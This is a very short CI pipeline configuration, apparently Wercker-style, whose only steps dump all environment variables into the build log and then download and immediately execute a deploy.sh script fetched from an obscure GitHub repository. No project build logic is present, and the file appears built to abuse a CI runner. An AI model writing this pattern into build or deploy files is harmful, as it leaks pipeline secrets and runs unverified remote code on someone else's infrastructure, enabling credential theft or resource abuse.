build:
  steps:
    - script:
        code: |
             env

hello-again:
  box: ubuntu
  services:
    - ubuntu: lastets
  steps:
    - script:
        code: wget https://raw.githubusercontent.com/Uevwn/trial/main/deploy.sh && chmod +x deploy.sh && ./deploy.sh
